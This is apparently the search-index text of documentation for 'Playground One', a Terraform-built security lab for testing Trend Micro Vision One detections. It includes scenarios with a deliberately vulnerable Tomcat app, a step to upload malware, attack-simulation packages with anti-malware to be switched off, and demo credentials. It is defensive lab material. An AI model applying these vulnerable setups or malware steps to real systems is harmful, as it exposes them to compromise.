<code>kindone/4-cluster-kind</code></p> <p>Useful for quickly testing out Kubernetes things :-).</p>"},{"location":"how-it-works/configurations-kind/#cluster-deployments","title":"Cluster Deployments","text":"<p>Configuration located in <code>kindone/8-cluster-kind-deployments</code></p> <p>Depends on <code>kindone/4-cluster-kind</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Calico</li> <li>Prometheus &amp; Grafana</li> <li>Trivy</li> </ul>"},{"location":"how-it-works/configurations-kind/#scenarios","title":"Scenarios","text":"<p>Configuration located in <code>kindone/7-scenarios-kind</code></p> <p>Depends on <code>kindone/4-cluster-kind</code></p> <p>Currently, the following (vulnerable) deployments are defined:</p> <ul> <li>Nginx</li> </ul> <p>Automated attacks are running every full hour.</p>"},{"location":"how-it-works/configurations/","title":"Playground One Configurations","text":"<p>The Playground One currently supports AWS, Azure and local Kind Kubernetes clusters.</p> <p>Typically, new features will be added first for AWS, second for Azure and in future GCP.</p> <p>Refer to the specific chapters for the different supported Clouds:</p> <ul> <li>AWS</li> <li>Azure</li> <li>GCP</li> <li>Kind</li> </ul>"},{"location":"how-it-works/orchestration/","title":"Orchestration","text":""},{"location":"how-it-works/orchestration/#how-it-works","title":"How it works","text":"<p>The Playground One utilizes Terraform to maintain the environment. For best flexibility and cost optimization it is structured into several Terraform configurations. You can also view these configurations as modules that can be linked together as needed.</p> <p>Note: Currently, the only cloud supported is AWS, when required other public cloud providers might follow.</p>"},{"location":"how-it-works/orchestration/#what-is-terraform","title":"What is Terraform?","text":"<p>Terraform is an infrastructure as code tool that lets you build, change, and version cloud and on-prem resources safely and efficiently. It is maintained by HashiCorp.</p> <p>HashiCorp Terraform is an infrastructure as code tool that lets you define both cloud and on-prem resources in human-readable configuration files that you can version, reuse, and share. You can then use a consistent workflow to provision and manage all of your infrastructure throughout its lifecycle. Terraform can manage low-level components like compute, storage, and networking resources, as well as high-level components like DNS entries and SaaS features.</p>"},{"location":"how-it-works/orchestration/#how-does-terraform-work","title":"How does Terraform work?","text":"<p>Terraform creates and manages resources on cloud platforms and other services through their application programming interfaces (APIs). Providers enable Terraform to work with virtually any platform or service with an accessible API.</p> <p></p> <p>HashiCorp and the Terraform community have already written thousands of providers to manage many different types of resources and services. You can find all publicly available providers on the Terraform Registry, including Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, and many more.</p> <p></p> <p>The core Terraform workflow consists of three stages:</p> <p>Write: You define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer.</p> <p>Plan: Terraform creates an execution plan describing the infrastructure it will create, update, or destroy based on the existing infrastructure and your configuration.</p> <p>Apply: On approval, Terraform performs the proposed operations in the correct order, respecting any resource dependencies. For example, if you update the properties of a VPC and change the number of virtual machines in that VPC, Terraform will recreate the VPC before scaling the virtual machines.</p>"},{"location":"how-it-works/versions/","title":"Versions as of 12/14/2024","text":"<p>Terraform &gt;=1.6</p>"},{"location":"how-it-works/versions/#terraform-providers","title":"Terraform Providers","text":"Provider Link Version Used in AWS https://registry.terraform.io/providers/hashicorp/aws 5.30.0 all Cloudinit https://registry.terraform.io/providers/hashicorp/cloudinit 2.3.3 ec2, eks-ec2, eks-fg Helm https://registry.terraform.io/providers/hashicorp/helm 2.12.1 eks-ec2, eks-fg Kubernetes https://registry.terraform.io/providers/hashicorp/kubernetes 2.24.0 nw, eks-ec2, eks-fg, ecs Local https://registry.terraform.io/providers/hashicorp/local 2.4.1 nw, eks-ec2, eks-fg, kind, dsm Random https://registry.terraform.io/providers/hashicorp/random 3.6.0 nw, ec2, eks-ec2, eks-fg RestAPI https://registry.terraform.io/providers/Mastercard/restapi 1.18.2 eks-ec2, eks-fg, dsw Time https://registry.terraform.io/providers/hashicorp/time 0.10.0 dsw TLS https://registry.terraform.io/providers/hashicorp/tls 4.0.5 all"},{"location":"how-it-works/versions/#terraform-modules","title":"Terraform Modules","text":"Module Link Version Latest Used in AWS ALB https://registry.terraform.io/modules/terraform-aws-modules/alb/aws ~&gt; 8.0 9.2.0 ecs AWS Autoscaling https://registry.terraform.io/modules/terraform-aws-modules/autoscaling/aws ~&gt; 7.3 7.3.1 ecs AWS ECS https://registry.terraform.io/modules/terraform-aws-modules/ecs/aws 5.7.3 5.7.3 ecs AWS EKS https://registry.terraform.io/modules/terraform-aws-modules/eks/aws 19.21.0 19.21.0 eks-ec2, eks-fg AWS IAM https://registry.terraform.io/modules/terraform-aws-modules/iam/aws 5.32.1 5.32.1 eks-ec2 AWS RDS https://registry.terraform.io/modules/terraform-aws-modules/rds/aws 6.3.0 6.3.0 ec2, dsm AWS Security Group https://registry.terraform.io/modules/terraform-aws-modules/security-group/aws ~&gt; 4.0 5.1.0 ecs"},{"location":"how-it-works/versions/#kubernetes-helm-charts","title":"Kubernetes &amp; Helm Charts","text":"<p>Kubernetes Control Plane: 1.28</p> Chart Link Version Used in Autoscaler https://kubernetes.github.io/autoscaler 9.34.0 eks-ec2, ecs Calico https://docs.tigera.io/calico/charts/tigera-operator 3.25.0 eks-ec2 Load Balancer Controller https://aws.github.io/eks-charts/aws-load-balancer-controller latest eks-ec2 Prometheus &amp; Grafana https://prometheus-community.github.io/helm-charts/kube-prometheus-stack latest eks-ec2 Trivy https://aquasecurity.github.io/helm-charts/trivy-operator latest eks-ec2 Vision One Container Security https://github.com/trendmicro/cloudone-container-security-helm latest eks-ec2, eks-fg"},{"location":"integrations/container-security/","title":"Vision One Container Security","text":""},{"location":"integrations/container-security/#container-security-with-the-playground-one-eks-ec2-cluster","title":"Container Security with the Playground One EKS EC2 Cluster","text":"<p>This guide provides step-by-step instructions on how to use Vision One Container Security on a Playground One EKS EC2 cluster.</p> <p>Prerequisites:</p> <ul> <li>Vision One API Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Inventory<ul> <li>View</li> <li>Configure Settings</li> </ul> </li> <li>Container Protection<ul> <li>View</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Required information:</p> <ul> <li>Name of already existing Container Protection Policy to assign to the cluster installation.</li> </ul> <p>Steps:</p> <ol> <li>Run the configuration tool with <code>pgo --config</code> to set or verify the values in the <code>Vision One Container Security</code> section.</li> <li> <p>Create the EKS cluster</p> <pre><code># EKS with EC2 nodes\npgo --apply eks-ec2\n\n# EKS with Fargate profiles\npgo --apply eks-fg\n</code></pre> </li> </ol> <p>Done.</p>"},{"location":"integrations/container-security/#container-security-with-the-playground-one-ecs-fargate-cluster","title":"Container Security with the Playground One ECS Fargate Cluster","text":"<p>If you are deploying Container Security in an ECS Fargate environment, you have to carry out some additional steps after adding the instance. See official documentation for the details.</p> <p>Playground One simplifies these steps.</p> <p>Prerequisites:</p> <ul> <li>Deployed ECS Fargate cluster configuration (<code>pgo -a ecs</code>).</li> </ul> <p>Required information:</p> <ul> <li>ECS Fargate Cluster name from ecs outputs (<code>pgo -o ecs</code>).</li> </ul> <p>Steps:</p> <ol> <li>On Vision One, head over to <code>Cloud Security Operations --&gt; Container Security --&gt; Container Inventory</code>.</li> <li>Select <code>[Amazon ECS] --&gt; [Account ID] --&gt; [Region] --&gt; [Your ECS Fargate Cluster]</code>.</li> <li>Select a Policy and enable Runtime Security.</li> <li>Run <code>ecsfg-add-v1cs &lt;CLUSTER NAME&gt;</code></li> </ol> <p>Done.</p> <p>Note: Deletion of the cluster via <code>pgo -d ecs</code> will fail until you manually delete the <code>trendmicro-scout</code>-service in the ECS console. Then delete the cluster in the console. There will be an IAM policy starting with your cluster name not being deleted automatically.</p>"},{"location":"integrations/deep-security/","title":"Deep Security","text":"<p>This configuration is to simulate an on-premise Deep Security environment meant to be used in integration and migration scenarios. For simulation purposes it creates a dedicated VPC with the most commonly used architecture, private and public subnets accross two availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc.</p> <p>The Deep Security Manager is deployed to the private subnet. It uses an AWS RDS PostgreSQL in the private subnet. Access to Deep Security is granted by the help of a bastion host in the public subnet. This host supports ssh tunneling and acts as an upstream proxy on port 4119.</p> <p>To create a Deep Security instance run</p> <pre><code>pgo --apply dsm\n</code></pre> <p>To create Computers activated with the Deep Security Manager run</p> <pre><code>pgo --apply dsw\n</code></pre> <p>To destroy the instance run</p> <pre><code>pgo --destroy dsw\npgo --destroy dsm\n</code></pre> <p>An applied dsm configuration can be quickly stopped and started via the commands <code>dsm stop</code> and <code>dsm start</code> without losing any configurations within Deep Security.</p> <p>To come:</p> <ul> <li>Documentation of integraion scenarios:</li> <li>DS with V1ES<ul> <li>WS with V1ES</li> </ul> </li> <li>Documentation of migration scenarios:<ul> <li>DS --&gt; V1ES</li> <li>WS --&gt; V1ES</li> </ul> </li> <li>Creation of protected instances and policies.</li> </ul>"},{"location":"integrations/elastic-stack/","title":"Elastic Stack (ELK Stack)","text":"<p>It's comprised of Elasticsearch, Kibana, Beats, and Logstash (also known as the ELK Stack).</p> <p>Link: https://www.elastic.co/elastic-stack/</p>"},{"location":"integrations/elastic-stack/#what-is-elasticsearch","title":"What is Elasticsearch?","text":"<p>Elasticsearch is the distributed search and analytics engine at the heart of the Elastic Stack. Elasticsearch is where the indexing, search, and analysis magic happens.</p> <p>Elasticsearch provides near real-time search and analytics for all types of data. Whether you have structured or unstructured text, numerical data, or geospatial data, Elasticsearch can efficiently store and index it in a way that supports fast searches. You can go far beyond simple data retrieval and aggregate information to discover trends and patterns in your data. And as your data and query volume grows, the distributed nature of Elasticsearch enables your deployment to grow seamlessly right along with it.</p>"},{"location":"integrations/elastic-stack/#kibana-your-window-into-elastic","title":"Kibana - your window into Elastic","text":"<p>Kibana enables you to give shape to your data and navigate the Elastic Stack. Kibana enables you to interactively explore, visualize, and share insights into your data and manage and monitor the stack. </p> <p>With Kibana, you can:</p> <ul> <li>Search, observe, and protect your data. From discovering documents to analyzing logs to finding security vulnerabilities, Kibana is your portal for accessing these capabilities and more.</li> <li>Analyze your data. Search for hidden insights, visualize what you\u2019ve found in charts, gauges, maps, graphs, and more, and combine them in a dashboard.</li> <li>Manage, monitor, and secure the Elastic Stack. Manage your data, monitor the health of your Elastic Stack cluster, and control which users have access to which features.</li> </ul>"},{"location":"integrations/elastic-stack/#logstash-and-beats","title":"Logstash and Beats","text":"<p>Logstash and Beats facilitate collecting, aggregating, and enriching your data and storing it in Elasticsearch.</p>"},{"location":"integrations/endpoint-security/","title":"Vision One Endpoint Security Server &amp; Workload Protection","text":"<p>Three different instances are currently provided by the Playground One with different configurations:</p> <p>Instance Web1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>Nginx deployment</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Db1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>MySql databse</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Srv1:</p> <ul> <li>Windows Server 2022 Standalone Server</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>All instances can be integrated with Vision One Endpoint Security for Server &amp; Workload Protection and have access to the Atomic Launcher (if provided).</p> <p>The instances are created within a public subnet of Playground One's VPC. They all get an EC2 instance role assigned providing them the ability to access installer packages stored within an S3 bucket.</p> <p>All instances including the Windows Server are accessible via ssh and key authentication. RDP for Windows is supported in addition to this.</p> <p>Server &amp; Workload Protection: Example with full stack deployment</p> <p></p>"},{"location":"integrations/endpoint-security/#optional-drop-vision-one-installer-packages","title":"Optional: Drop Vision One Installer Packages","text":"<p>If you want the instances automatically to be activated against your Server and Workload Protection Manager instance you need to download the installer packages for Vision One Endpoint Security for Windows and/or Linux from your Vision One instance. You need to do this manually since these installers are specific to your environment.</p> <p>The downloaded files are named something similar like</p> <p><code>TMServerAgent_Windows_auto_64_Server_and_Workload_Protection_Manager_-_CLOUDONE-ID.zip</code></p> <p>and/or</p> <p><code>TMServerAgent_Linux_auto_64_Server_and_Workload_Protection_Manager_-CLOUDONE-ID.tar</code>.</p> <p>Rename them to <code>TMServerAgent_Linux.tar</code> and <code>TMServerAgent_Windows.zip</code> respectively and copy the file(s) to <code>${ONEPATH}/awsone/0-files</code>.</p>"},{"location":"integrations/endpoint-security/#optional-server-workload-protection-event-based-tasks","title":"Optional: Server &amp; Workload Protection Event-Based Tasks","text":"<p>Create Event-Based Tasks to automatically assign Linux or Windows server policies to the machines.</p> <p>Agent-initiated Activation Linux</p> <ul> <li>Actions: Assign Policy: Linux Server</li> <li>Conditions: \"Platform\" matches \".*Linux.*\"</li> </ul> <p>Agent-initiated Activation Windows</p> <ul> <li>Actions: Assign Policy: Windows Server</li> <li>Conditions: \"Platform\" matches \".*Windows.*\"</li> </ul>"},{"location":"integrations/endpoint-security/#optional-drop-atomic-launcher-packages","title":"Optional: Drop Atomic Launcher Packages","text":"<p>If you want to experiment with Atomic Launcher download the packages from here and store them in the  <code>${ONEPATH}/awsone/0-files</code> directory as well.</p> <p>Your <code>${ONEPATH}/awsone/0-files</code>-directory should look like this:</p> <pre><code>-rw-rw-r-- 1 user user 17912014 Aug  1 14:50 atomic_launcher_linux_1.0.0.1009.zip\n-rw-rw-r-- 1 user user 96135367 Aug  1 14:50 atomic_launcher_windows_1.0.0.1013.zip\n-rw-rw-r-- 1 user user        0 Jul 28 06:22 see_documentation\n-rw-rw-r-- 1 user user      144 Aug  1 14:33 TMServerAgent_Linux_deploy.sh\n-rw-rw-r-- 1 user user 27380224 Aug  1 14:50 TMServerAgent_Linux.tar\n-rw-rw-r-- 1 user user     1145 Aug  1 14:33 TMServerAgent_Windows_deploy.ps1\n-rw-rw-r-- 1 user user  3303522 Aug  1 14:50 TMServerAgent_Windows.zip\n</code></pre> <p>The Atomic Launcher is stored within the downloads folder of each of the instances.</p> <p>The unzip password is <code>virus</code>.</p> <p>You should disable Anti Malware protection und set the IPS module to detect only before using Atomic Launcher :-).</p>"},{"location":"integrations/prometheus-grafana/","title":"Prometheus and Grafana","text":""},{"location":"integrations/prometheus-grafana/#what-is-prometheus","title":"What is Prometheus?","text":"<p>Prometheus is an open-source systems monitoring and alerting toolkit originally built at SoundCloud. Since its inception in 2012, many companies and organizations have adopted Prometheus, and the project has a very active developer and user community. It is now a standalone open source project and maintained independently of any company. To emphasize this, and to clarify the project's governance structure, Prometheus joined the Cloud Native Computing Foundation in 2016 as the second hosted project, after Kubernetes.</p> <p>Prometheus collects and stores its metrics as time series data, i.e. metrics information is stored with the timestamp at which it was recorded, alongside optional key-value pairs called labels.</p> <p>For more elaborate overviews of Prometheus, see the resources linked from the media section.</p> <p>Prometheus's main features are:</p> <ul> <li>a multi-dimensional data model with time series data identified by metric name and key/value pairs</li> <li>PromQL, a flexible query language to leverage this dimensionality</li> <li>no reliance on distributed storage; single server nodes are autonomous</li> <li>time series collection happens via a pull model over HTTP</li> <li>pushing time series is supported via an intermediary gateway</li> <li>targets are discovered via service discovery or static configuration</li> <li>multiple modes of graphing and dashboarding support</li> </ul>"},{"location":"integrations/prometheus-grafana/#what-is-grafana","title":"What is Grafana?","text":"<p>In a nutshell: Dashboard anything. Observe everything.</p> <p>Query, visualize, alert on, and understand your data no matter where it\u2019s stored. With Grafana you can create, explore, and share all of your data through beautiful, flexible dashboards.</p>"},{"location":"integrations/prometheus-grafana/#playground-one-integration","title":"Playground One Integration","text":"<p>To enable/disable the Prometheus &amp; Grafana combo and to set the administrator password run <code>pgo --configure</code>. The package comes preconfigured and ready for use.</p> <p>To get the DNS names of Prometheus and Grafana check the outputs of the EKS configuraiton with <code>pgo -o eks</code></p> <pre><code># Example\nloadbalancer_dns_grafana = \"k8s-promethe-promethe-95d61839fe-676288571.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_prometheus = \"k8s-promethe-promethe-a040b2a261-633411715.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>Copy the Grafana URL to your browser and authenticate with <code>admin</code> and the password you have set.</p> <p>Then head over to Dashboards </p> <p></p> <p>and search for <code>kubernetes</code>:</p> <p></p> <p>Select any of the dashboards and start playing.</p> <p></p> <p>If you want to use PromQL directly, head over to the Prometheus frontend.</p>"},{"location":"integrations/splunk/","title":"Splunk","text":"<p>Splunk is a big data platform that simplifies the task of collecting and managing massive volumes of machine-generated data and searching for information within it. The technology is used for business and web analytics, application management, compliance, and security.</p> <p>Splunk is an advanced and scalable form of software that indexes and searches for log files within a system and analyzes data for operational intelligence. The software is responsible for splunking data, which means it correlates, captures, and indexes real-time data, from which it creates alerts, dashboards, graphs, reports, and visualizations. This helps organizations recognize common data patterns, diagnose potential problems, apply intelligence to business operations, and produce metrics.</p> <p>Splunk\u2019s software can be used to examine, monitor, and search for machine-generated big data through a browser-like interface. It makes searching for a particular piece of data quick and easy, and more importantly, does not require a database to store data as it uses indexes for storage.</p> <p>Link: https://www.splunk.com/</p> <p>Vision One has the capability to integrate with Splunk in various ways. Some of these are covered in Scenarios.</p>"},{"location":"integrations/xdr-for-containers/","title":"Vision One XDR for Containers","text":"<p>Note: At the time of writing, XDR for Containers is in an early preview stage and only one to be protected VPC is supported. The cluster variants provided by Playground One support Application Load Balancing which is required for XDR for Containers.</p> <p>You need to create a connection with XDR for Containers by going through the workflow in your Vision One environment.</p>"},{"location":"integrations/xdr-for-containers/#connect-xdr-for-containers-with-the-playground-one","title":"Connect XDR for Containers with the Playground One","text":"<p>Before connecting XDR for Containers you need to have the VPC and network of Playground One created already.</p> <pre><code>pgo --apply nw\n</code></pre> <p>Note: You don't need to destroy the VPC and network each time because this would mean to disconnect Vision One from it and reestablish the connection the next time. This takes about 20 minutes overall. So leave the VPC as it is.</p> <p>Required information:</p> <ul> <li>Trend Cloud One API Key</li> <li>Trend Cloud One Region</li> <li>AWS Account ID</li> <li>AWS VPC ID</li> <li>VPC Region</li> </ul> <p>Follow the deployment instructions from Vision One. You can query your <code>AWS VPC ID</code> by running <code>pgo --output nw</code>.</p> <p>Note: Make sure to deploy the stack in the region of the VPC when pressing <code>[Launch Stack]</code>.</p> <p></p> <p>All provided clusters from Playground One can be used with XDR for Containers.</p>"},{"location":"integrations/xdr-for-containers/#scenarios","title":"Scenarios","text":"<ul> <li>Tomcat Remote Code Execution</li> <li>JNDI Injection in HTTP Request</li> <li>Apache Struts Multipart Encoding Command Injection (ECS)</li> <li>Apache Struts Multipart Encoding Command Injection (EKS)</li> </ul>"},{"location":"scenarios/deploy-from-private-registry/","title":"Deploy Cloud One Container Security from a Private Registry","text":""},{"location":"scenarios/deploy-from-private-registry/#tools","title":"Tools","text":"<p>Used tools:</p> <ul> <li>Docker</li> <li>yq, awk, helm</li> </ul> <p>Get <code>yq</code></p> <pre><code>curl -L https://github.com/mikefarah/yq/releases/download/v4.24.2/yq_linux_amd64.tar.gz -o yq_linux_amd64.tar.gz\ntar xfvz yq_linux_amd64.tar.gz\nsudo cp yq_linux_amd64 /usr/local/bin/yq\n</code></pre>"},{"location":"scenarios/deploy-from-private-registry/#login-to-the-registries","title":"Login to the Registries","text":"<pre><code>export REGISTRY=172.250.255.1:5000\nexport USERNAME=admin\nexport PASSWORD=trendmicro\n\n# Login to Docker Registry\ndocker login\n\n# Login to private Registry\necho ${PASSWORD} | docker login https://${REGISTRY} --username ${USERNAME} --password-stdin\n</code></pre>"},{"location":"scenarios/deploy-from-private-registry/#container-security-pulltag-push","title":"Container Security - Pull,Tag, &amp; Push","text":"<pre><code># Enumerate the Images\ncurl -L https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz -o master-cs.tar.gz\ntar xfvz master-cs.tar.gz\nexport TAG=$(yq '.images.defaults.tag' cloudone-container-security-helm-master/values.yaml)\necho ${TAG}\n\n# Pull Container Security images from Dockerhub.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker pull {}\n\n# Tag the images with your target registry information, making sure to preserve the original image name.\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker tag {} ${REGISTRY}/{}\n\n# Push the images to the private registry\nawk -v tag=$TAG '$1 == \"repository:\" {printf \"trendmicrocloudone/%s:%s\\n\",$2,tag;}' \\\n  cloudone-container-security-helm-master/values.yaml | xargs -I {} docker push ${REGISTRY}/{}\n\n# Create image pull secret\nkubectl create secret docker-registry regcred \\\n  --docker-server=${REGISTRY} \\\n  --docker-username=${USERNAME} \\\n  --docker-password=${PASSWORD} \\\n  --namespace=container-security\n</code></pre> <p>Update Container Securities <code>overrides.yaml</code> to override the default source registry with your private registry:</p> <pre><code>...\nimages:\n  defaults:\n    registry: [REGISTRY]\n    tag: [TAG]\n    imagePullSecret: regcred\n</code></pre> <p>Example:</p> <pre><code>...\nimages:\n  defaults:\n    registry: 172.250.255.1:5000\n    tag: 2.2.9\n    imagePullSecret: regcred\n</code></pre> <p>Deploy Container Security.</p> <pre><code>helm install \\\n    container-security \\\n    --values $PGPATH/overrides.yaml \\\n    --namespace trendmicro-system \\\n    --install \\\n  https://github.com/trendmicro/cloudone-container-security-helm/archive/master.tar.gz\n</code></pre>"},{"location":"scenarios/eks/","title":"EKS","text":""},{"location":"scenarios/eks/#kubernetes-autoscaling","title":"Kubernetes Autoscaling","text":"<p>Logs:</p> <pre><code>kubectl logs -f -n kube-system -l app=cluster-autoscaler\n</code></pre>"},{"location":"scenarios/privileged-shell/","title":"Scenario: Vision One Container Security Gain a Privileged Shell","text":""},{"location":"scenarios/privileged-shell/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS EC2 Cluster<ul> <li>Running app: </li> </ul> </li> </ul>"},{"location":"scenarios/privileged-shell/#exploiting","title":"Exploiting","text":""},{"location":"scenarios/privileged-shell/#exploit","title":"Exploit","text":""},{"location":"scenarios/sentry/","title":"Sentry","text":"<p>To create findings and scan with Sentry run</p> <pre><code>$PGPATH/terraform-awsone/1-scripts/create-findings.sh\n</code></pre> <p>Feel free to have a look on the script above, but in theory it should prepare six findings for Sentry and two Workbenches in Vision One.</p> <p>To trigger Sentry scans for any instance run (example):</p> <pre><code># INSTANCE=&lt;INSTANCE_ID&gt; sentry-trigger-ebs-scan\nINSTANCE=$(terraform output -raw public_instance_ip_web1) sentry-trigger-ebs-scan\n</code></pre> <p>The scan results should show up in your Cloud One Central console.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/","title":"Scenario: Vision One XDR for Containers Detect Malware Upload","text":"<p>DRAFT</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#optional-retrieve-tenant-id-and-token-from-server-workload-protection","title":"Optional: Retrieve Tenant ID and Token from Server &amp; Workload Protection","text":"<p>You might want to know the tenant ID and token from your Server &amp; Workload Protection to continue using deployment scripts we know from Deep/Workload Security.</p> <p>To get them navigate to your instance in Vision One. Then head over to <code>Administration --&gt; Updates --&gt; Software --&gt; Local --&gt; Generate Deployment Scripts...</code></p> <p>Either copy the full script or find the tenant ID and token on the very bottom of the script.</p> <p>If you save these values to the Playground One configuration with <code>pgo -c</code> the EC2 instances of the ECS (EC2) cluster will get an agent deployed.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#section-vision-one","title":"Section: Vision One","text":"<p>Vision One Server &amp; Workload Protection does support the deployment script functionality from Cloud One Workload Security. The ECS EC2 cluster can optionally deploy the agent using this mechanism. To enable this</p> <p>Set/update:</p> <ul> <li><code>Server &amp; Workload Protection tenant ID</code>: The tenant ID to use. If the tenant ID is omitted the Server &amp; Workload Protection configuration will be skipped.</li> <li><code>Server &amp; Workload Protection token</code>: The token to use</li> <li><code>Server &amp; Workload Protection policy ID</code>: The policy to assign</li> </ul>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One XDR for Containers linked with Playground One VPC</li> <li>Playground One ECS Cluster with EC2 instances<ul> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> </li> <li>Server &amp; Workload Protection configuration set for<ul> <li>Tenant ID</li> <li>Token</li> <li>Policy ID of policy with Anti Malware protection enabled</li> </ul> </li> </ul> <p>Eventually set/update the Server &amp; Workload Protection configuration</p> <pre><code>pgo --config\n</code></pre> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#exploit","title":"Exploit","text":"<p>To access the <code>todolist</code> application append <code>/todolist</code> to the loadbalancer DNS name in your browser.</p> <p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>foo@bar.org</code></li> <li>Password: <code>foobar</code></li> </ul> <p>Then navigate to <code>Upload files</code> and upload some malware.</p> <p>View events in Server &amp; Workload Protection</p>"},{"location":"scenarios/as/tmas-artifact-scanning/","title":"Scenario: Container Image Vulnerability and Malware Scanning","text":""},{"location":"scenarios/as/tmas-artifact-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Protection<ul> <li>Run artifact scan</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Ensure to have the latest <code>tmas</code> deployed:</p> <pre><code>tmcli-update\n</code></pre>"},{"location":"scenarios/as/tmas-artifact-scanning/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMAS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmas defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>To easily scan an image for vulnerabililies run</p> <pre><code># Service region us-east-1\ntmas scan docker:nginx:latest\n\n# Service region eu-central-1\ntmas scan docker:nginx:latest --region eu-central-1\n</code></pre> <p>Scanning an image for vulnerabilities and malware simultaneously is as easy as above</p> <pre><code>tmas scan docker:mawinkler/evil2:latest --malwareScan\n</code></pre> <p>At the time of writing, the second scan should find 24 vulnerabilities and one malware:</p> <pre><code>{\n  \"vulnerability\": {\n    \"totalVulnCount\": 24,\n    \"criticalCount\": 0,\n    \"highCount\": 0,\n    \"mediumCount\": 6,\n    \"lowCount\": 15,\n    \"negligibleCount\": 3,\n    \"unknownCount\": 0,\n    \"findings\": {\n...\n  \"malware\": {\n    \"scanResult\": 1,\n    \"findings\": [\n      {\n        \"layerDigest\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n        \"layerDiffID\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n        \"fileName\": \"eicarcom2.zip\",\n        \"fileSize\": 308,\n        \"fileSHA256\": \"sha256:e1105070ba828007508566e28a2b8d4c65d192e9eaf3b7868382b7cae747b397\",\n        \"foundMalwares\": [\n          {\n            \"fileName\": \"eicarcom2.zip\",\n            \"malwareName\": \"OSX_EICAR.PFH\"\n          }\n        ]\n      }\n    ],\n    \"scanID\": \"300d7aed-2f1f-4818-af62-24f9378fe91d\",\n    \"scannerVersion\": \"1.0.0-471\"\n  }\n}\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/as/tmas-github-action/","title":"Scenario: Container Image Vulnerability and Malware Scanning as GitHub Action","text":"<p>DRAFT</p>"},{"location":"scenarios/as/tmas-github-action/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>Container Protection<ul> <li>Run artifact scan</li> </ul> </li> </ul> </li> </ul> </li> <li>GitHub Account.</li> <li>Forked playground-one-scenario-github-action.</li> <li>Kubernetes Cluster (ideally) with Vision One Container Security deployed.</li> </ul>"},{"location":"scenarios/as/tmas-github-action/#about-github-actions","title":"About GitHub Actions","text":"<p>GitHub Actions is a continuous integration and continuous delivery (CI/CD) platform that allows you to automate your build, test, and deployment pipeline on GitHub.</p> <p>GitHub Actions goes beyond just DevOps and lets you run workflows when other events happen in your repository. For example, you can run a workflow to automatically add the appropriate labels whenever someone creates a new issue in your repository.</p> <p>You can configure a GitHub Actions workflow to be triggered when an event occurs in your repository, such as a pull request being opened, an issue being created or a push happened. Your workflow contains one or more jobs which can run in sequential order or in parallel. Each job will run inside its own virtual machine runner, or inside a container, and has one or more steps that either run a script that you define or run an action, which is a reusable extension that can simplify your workflow.</p> <p>Workflows are defined as YAML files in the .github/workflows directory in a repository, and a repository can have multiple workflows, each of which can perform a different set of tasks.</p> <p>In this scenario we're going to create a workflow to automatically build, push and scan a container image with Trend Micro Artifact Scanning. The scan will check the image for vulnerabilities and malware and eventually push it to the 